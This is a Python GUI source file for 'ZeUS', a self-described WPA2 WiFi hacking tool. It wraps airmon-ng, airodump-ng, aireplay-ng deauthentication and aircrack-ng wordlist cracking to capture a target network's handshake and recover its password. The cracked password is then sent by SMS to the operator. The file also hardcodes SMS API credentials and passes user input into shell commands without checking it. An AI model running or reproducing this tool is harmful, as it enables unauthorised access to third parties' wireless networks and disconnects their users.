import os
import subprocess
import tkinter as tk
from tkinter import Entry
import random
import requests

URL = 'http://www.way2sms.com/api/v1/sendCampaign'

LARGE_FONT = ("Courier", 100, "bold")
SMALL_FONT = ("Courier", 20)

phone_number = ''
BSSID = ''
channel = ''
dirpath = ''
card = ''
code=''

BG = "Black"
FG1 = "green yellow"
FG2 = "white"


class ZeUS(tk.Tk):

    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)
        container = tk.Frame(self)

        container.pack(side="top", fill="both", expand=True)

        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)

        self.frames = {}

        for F in (StartPage, PageOne, PageTwo, PageThree, PageFour,PageFive):
            frame = F(container, self)

            self.frames[F] = frame

            frame.grid(row=0, column=0, sticky="nsew")

        self.show_frame(StartPage)

    def show_frame(self, cont):
        frame = self.frames[cont]
        frame.tkraise()

    def quit(self):
        subprocess.call("airmon-ng stop " + card, shell=True)
        self.destroy()


class StartPage(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent, bg=BG)

        label1 = tk.Label(self, bg=BG, fg=FG1, text="Use this tool for fun, not revenge!!",
                          font=SMALL_FONT)
        label1.pack(fill="x", ipadx=70, ipady=10, side="top", expand="yes")

        label2 = tk.Label(self, bg=BG, fg=FG1, text="Welcome to ZeUS®", font=LARGE_FONT)
        label2.pack(fill="x", ipadx=50, ipady=10, expand="yes")

        label3 = tk.Label(self, bg=BG, fg=FG1, text="a WPA2 WiFi Hacking Tool",
                          font=("Courier", 20))
        label3.pack(fill="x")

        label4 = tk.Label(self, bg=BG, fg=FG2, text="Enter your mobile number below:", font=("Courier", 40, "bold"))
        label4.pack(pady=10, fill="x", expand="yes")

        e1 = ''
        entry1: Entry = tk.Entry(self, textvariable=e1, width=30, font=("Courier", 20),
                                 justify="center")
        entry1.pack(ipady=5, expand="yes")

        button = tk.Button(self, text="Get Code", fg="forest green", font=("Courier", 40, "bold"),
                           command=lambda: self.verify(entry1.get(), controller))
        button.pack(ipadx=20, ipady=5, pady=20, expand="yes")

        label4 = tk.Label(self, bg=BG, fg=FG1,
                          text="about: \nThis a project developed by Harsh Vadalia and Bhogayata Amrita.\nAll rights reserved ZeUS®",
                          font=SMALL_FONT)
        label4.pack(ipady=5, side="bottom", fill="x")

    def verify(self, ph_no, controller):

        global phone_number

        if ph_no != '' and len(ph_no)==10:
            print(ph_no)
            phone_number = ph_no
            self.sendsms()
            subprocess.call("clear", shell=True)
            controller.show_frame(PageFour)
        else:
            return

    def sendsms(self):
        global phone_number
        global code
        # get request
        def sendGetRequest(reqUrl, apiKey, secretKey, useType, phoneNo, senderId, textMessage):
            req_params = {
                'apikey': apiKey,
                'secret': secretKey,
                'usetype': useType,
                'phone': phoneNo,
                'message': textMessage,
                'senderid': senderId
            }
            return requests.get(reqUrl, req_params)
        code = str(random.randrange(1000,9999,1))
        # get response
        text = "ZeUS® \nYour code is " +code
        response = sendGetRequest(URL, 'CKJ7IAOZDXOFJYQ55KHZWP90F00NH4E3', 'VM057TRYNGPKQN56', 'stage', phone_number,
                                  'ZeUS97',
                                  text)

        # print response if you want
        print(response.text)


class PageFour(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent, bg=BG)
        frame1 = tk.Frame(self, bg=BG)
        self.grid_rowconfigure(5, weight=1)
        button = tk.Button(frame1, text="Cancel", fg="red", font=("Courier", 25, "bold"),
                            command=lambda: controller.show_frame(StartPage))
        button.pack(pady=10, ipadx=7, ipady=4, side="top")
        label5 = tk.Label(frame1, bg=BG, fg=FG2, text="Enter the 4 digit received code:", font=("Courier", 40, "bold"))
        label5.pack(pady=10, fill="x", expand="yes")

        entry2: Entry = tk.Entry(frame1, width=30, font=("Courier", 20),
                                 justify="center")
        entry2.pack(ipady=5, expand="yes")

        button = tk.Button(frame1, text="Verify Number", fg="forest green", font=("Courier", 40, "bold"),
                           command=lambda: self.check_code(entry2.get(), controller))
        button.pack(ipadx=20, ipady=5, pady=20, expand="yes")
        frame1.pack(ipadx=20, ipady=10, side="top", expand="yes")

        frame2 = tk.Frame(self, bg=BG)
        button = tk.Button(frame2, text="Back", fg="blue", font=("Courier", 25, "bold"),
                           command=lambda: controller.show_frame(StartPage))
        button.pack(pady=10, ipadx=7, ipady=4, side="left")
        button2 = tk.Button(frame2, text="Cancel", fg="red", font=("Courier", 25, "bold"),
                            command=lambda: ZeUS.quit())
        button2.pack(pady=10, ipadx=7, ipady=4, side="right")
        label4 = tk.Label(frame2, bg=BG, fg=FG1,
                          text="about: \nThis a project developed by Harsh Vadalia and Bhogayata Amrita.\nAll rights reserved ZeUS®",
                          font=SMALL_FONT)
        label4.pack(ipady=5, side="bottom", fill="x")
        frame2.pack(side="bottom", fill="x")

    def check_code(self,code_input, controller):

        global code
        if code_input != '' and code==code_input:
            controller.show_frame(PageFive)
        else:
            controller.show_frame(PageFour)


class PageFive(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent, bg=BG)
        frame1 = tk.Frame(self, bg=BG)
        self.grid_rowconfigure(5, weight=1)
        label5 = tk.Label(frame1, bg=BG, fg=FG2, text="Enter the wireless card ID :", font=("Courier", 40, "bold"))
        label5.pack(pady=10, fill="x", expand="yes")

        entry2: Entry = tk.Entry(frame1, width=30, font=("Courier", 20),
                                 justify="center")
        entry2.pack(ipady=5, expand="yes")

        button = tk.Button(frame1, text="START", fg="forest green", font=("Courier", 40, "bold"),
                           command=lambda: self.start(entry2.get(), controller))
        button.pack(ipadx=20, ipady=5, pady=20, expand="yes")
        frame1.pack(ipadx=20, ipady=10, side="top", expand="yes")

        frame2 = tk.Frame(self, bg=BG)
        button = tk.Button(frame2, text="Back", fg="blue", font=("Courier", 25, "bold"),
                           command=lambda: controller.show_frame(StartPage))
        button.pack(pady=10, ipadx=7, ipady=4, side="left")
        button2 = tk.Button(frame2, text="Cancel", fg="red", font=("Courier", 25, "bold"),
                            command=lambda: ZeUS.quit())
        button2.pack(pady=10, ipadx=7, ipady=4, side="right")
        label4 = tk.Label(frame2, bg=BG, fg=FG1,
                          text="about: \nThis a project developed by Harsh Vadalia and Bhogayata Amrita.\nAll rights reserved ZeUS®",
                          font=SMALL_FONT)
        label4.pack(ipady=5, side="bottom", fill="x")
        frame2.pack(side="bottom", fill="x")


    def start(self,card_input, controller):
        global card
        if card_input != '':

            subprocess.call("airmon-ng start " + card_input, shell=True)
            # os.system('gnome-terminal --tab --title="test" --command="bash -c \'airmon-ng start wls8\'"')

            # subprocess.call("airodump-ng wls8mon",shell=False)
            os.system('gnome-terminal --tab --title="test" --command="bash -c \'airodump-ng '+card_input+'mon\'"')
            print(card_input)
            card = card_input
            subprocess.call("clear", shell=True)
            controller.show_frame(PageOne)
        else:
            return


class PageOne(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent, bg=BG)
        frame1 = tk.Frame(self, bg=BG)
        self.grid_rowconfigure(5, weight=1)

        label0 = tk.Label(frame1, bg=BG, fg="red", text="NOTE:\nClose the popped terminal before entering the following details!!", font=("Courier", 25, "bold"))

        label = tk.Label(frame1, text="ZeUS®", bg=BG, fg=FG1, font=("Courier", 70, "bold"))
        label1 = tk.Label(frame1, bg=BG, fg=FG1, text="Enter BSSID:", font=("Courier", 25, "bold"))
        label2 = tk.Label(frame1, bg=BG, fg=FG1, text="Enter Channel:", font=("Courier", 25, "bold"))
        entry1: Entry = tk.Entry(frame1, width=30, font=("Courier", 25))
        entry2: Entry = tk.Entry(frame1, width=30, font=("Courier", 25))
        button1 = tk.Button(frame1, text="Continue", fg="forest green", font=("Courier", 40, "bold"),
                            command=lambda: self.capture(entry1.get(), entry2.get(), controller))
        label5 = tk.Label(frame1, bg=BG, fg=FG1, text="Enter all the necessary fields to continue...",
                          font=("Courier", 25, "bold"))

        label.grid(row=0, columnspan=2, pady=10, ipadx=7, ipady=3, sticky="n")
        label1.grid(row=1, column=0, pady=10, ipadx=7, ipady=3, sticky="e")
        label2.grid(row=2, column=0, pady=10, ipadx=7, ipady=3, sticky="e")
        entry1.grid(row=1, column=1, pady=10, ipadx=7, ipady=3, sticky="w")
        entry2.grid(row=2, column=1, pady=10, ipadx=7, ipady=3, sticky="w")
        button1.grid(row=4, columnspan=2, pady=50, ipadx=7, ipady=3, sticky="s")
        label5.grid(row=5, columnspan=2, pady=50, ipadx=7, ipady=3, sticky="s")
        frame1.pack(ipadx=20, ipady=10, side="top", expand="yes")

        frame2 = tk.Frame(self, bg=BG)
        frame2 = tk.Frame(self, bg=BG)
        button = tk.Button(frame2, text="Back", fg="blue", font=("Courier", 25, "bold"),
                           command=lambda: controller.show_frame(PageFour))
        button.pack(pady=10, ipadx=7, ipady=4, side="left")
        button2 = tk.Button(frame2, text="Cancel", fg="red", font=("Courier", 25, "bold"),
                            command=lambda: ZeUS.quit())
        button2.pack(pady=10, ipadx=7, ipady=4, side="right")
        label4 = tk.Label(frame2, bg=BG, fg=FG1,
                          text="about: \nThis a project developed by Harsh Vadalia and Bhogayata Amrita.\nAll rights reserved ZeUS®",
                          font=SMALL_FONT)
        label4.pack(ipady=5, side="bottom", fill="x")
        frame2.pack(side="bottom", fill="x")

    def capture(self, bssid, chan, controller):
        global BSSID
        global channel
        global dirpath

        BSSID = bssid
        channel = chan
        dirpath = os.getcwd()
        dirpath = dirpath + "/ZeUS"

        # subprocess.call("airodump-ng -c " + chan + " --bssid " + BSSID + " -w " + dirpath + " wls8mon", shell=True)
        os.system(
            'gnome-terminal --tab --title="quit" --command="bash -c \'airodump-ng -c ' + chan + ' --bssid ' + BSSID + ' -w ' + dirpath + ' ' + card + 'mon\'"')

        controller.show_frame(PageTwo)


class PageTwo(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent, bg=BG)
        frame1 = tk.Frame(self, bg=BG)
        self.grid_rowconfigure(5, weight=1)

        label = tk.Label(frame1, text="ZeUS®", bg=BG, fg=FG1, font=("Courier", 70, "bold"))

        label1 = tk.Label(frame1, bg=BG, fg=FG1,
                          text="Press Deauthenticate button to deauthenticate all the current users and continue.. \nThe next page will be shown after the deauthentication is completed",
                          font=("Courier", 25, "bold"))
        button1 = tk.Button(frame1, text="DEAUTH", fg="forest green", font=("Courier", 40, "bold"),
                            command=lambda: self.deauth(controller))

        label.grid(row=0, columnspan=2, pady=10, ipadx=7, ipady=3, sticky="n")
        label1.grid(row=1, column=0, pady=10, ipadx=7, ipady=3, sticky="e")
        button1.grid(row=2, columnspan=2, pady=50, ipadx=7, ipady=3, sticky="s")
        frame1.pack(ipadx=20, ipady=10, side="top", expand="yes")

        frame2 = tk.Frame(self, bg=BG)
        button = tk.Button(frame2, text="Back", fg="blue", font=("Courier", 25, "bold"),
                           command=lambda: controller.show_frame(PageOne))
        button.pack(pady=10, ipadx=7, ipady=4, side="left")
        button2 = tk.Button(frame2, text="Cancel", fg="red", font=("Courier", 25, "bold"),
                            command=lambda: ZeUS.quit())
        button2.pack(pady=10, ipadx=7, ipady=4, side="right")
        label4 = tk.Label(frame2, bg=BG, fg=FG1,
                          text="about: \nThis a project developed by Harsh Vadalia and Bhogayata Amrita.\nAll rights reserved ZeUS®",
                          font=SMALL_FONT)
        label4.pack(ipady=5, side="bottom", fill="x")
        frame2.pack(side="bottom", fill="x")

    def deauth(self, controller):
        global BSSID

        subprocess.call("aireplay-ng -0 20 -a " + BSSID + " " + card + "mon", shell=True)
        subprocess.call("clear",shell=True)
        # os.system('gnome-terminal --tab --title="quit" --command="bash -c \'aireplay-ng -0 20 -a ' + BSSID + ' wls8mon\'"')  # access & client bssid goes here
        controller.show_frame(PageThree)


class PageThree(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent, bg=BG)
        frame1 = tk.Frame(self, bg=BG)
        self.grid_rowconfigure(5, weight=1)

        label = tk.Label(frame1, text="ZeUS®", bg=BG, fg=FG1, font=("Courier", 70, "bold"))
        label1 = tk.Label(frame1, bg=BG, fg=FG1, text="Enter the wordlist filename:(optional)",
                          font=("Courier", 25, "bold"))
        entry1: Entry = tk.Entry(frame1, textvariable=phone_number, width=30, font=("Courier", 25))
        button1 = tk.Button(frame1, text="FIRE", fg="forest green", font=("Courier", 40, "bold"),
                            command=lambda: self.fire(entry1.get()))
        label.grid(row=0, columnspan=2, pady=10, ipadx=7, ipady=3, sticky="n")
        label1.grid(row=1, column=0, pady=10, ipadx=7, ipady=3, sticky="e")
        entry1.grid(row=1, column=1, pady=10, ipadx=7, ipady=3, sticky="w")
        button1.grid(row=2, columnspan=2, pady=50, ipadx=7, ipady=3, sticky="s")
        frame1.pack(ipadx=20, ipady=10, side="top", expand="yes")

        frame2 = tk.Frame(self, bg=BG)
        button = tk.Button(frame2, text="Back", fg="blue", font=("Courier", 25, "bold"),
                           command=lambda: controller.show_frame(PageTwo))
        button.pack(pady=10, ipadx=7, ipady=4, side="left")
        button2 = tk.Button(frame2, text="Cancel", fg="red", font=("Courier", 25, "bold"),
                            command=lambda: ZeUS.quit())
        button2.pack(pady=10, ipadx=7, ipady=4, side="right")
        label4 = tk.Label(frame2, bg=BG, fg=FG1,
                          text="about: \nThis a project developed by Harsh Vadalia and Bhogayata Amrita.\nAll rights reserved ZeUS®",
                          font=SMALL_FONT)
        label4.pack(ipady=5, side="bottom", fill="x")
        frame2.pack(side="bottom", fill="x")

    def fire(self, wordlist):
        global BSSID
        f = open('password.txt', 'r+')
        f.truncate(0)
        f.close()
        subprocess.call(
            "aircrack-ng -a2 -b " + BSSID + " -w " + wordlist + ".txt *.cap -l password.txt", shell=True)
        print('*******************************************************************')
        subprocess.call("clear",shell=True)
        self.sendsms()

    def sendsms(self):
        f = open("password.txt", "r")
        passwrd = f.readline()

        if passwrd == '':
            text = "HEY!! \n\nThe password of the selected wifi CAN'T be cracked. \n\n Damn, it's a tough NUT... \n\n.Thanks for using ZeUS. Happy Hacking!"
        else:
            text = "HEY!! \n\nThe password of the selected wifi is " + passwrd + " \n\n.Thanks for using ZeUS. Happy Hacking!"
        global phone_number

        # get request
        def sendGetRequest(reqUrl, apiKey, secretKey, useType, phoneNo, senderId, textMessage):
            req_params = {
                'apikey': apiKey,
                'secret': secretKey,
                'usetype': useType,
                'phone': phoneNo,
                'message': textMessage,
                'senderid': senderId
            }
            return requests.get(reqUrl, req_params)

        # get response
        response = sendGetRequest(URL, 'CKJ7IAOZDXOFJYQ55KHZWP90F00NH4E3', 'VM057TRYNGPKQN56', 'stage', phone_number,
                                  'ZeUS97',
                                  text)

        # print response if you want
        print(response.text)
        subprocess.call("clear",shell=True)
        ZeUS.quit()


app = ZeUS()
app.title('ZeUS®')
app.mainloop()
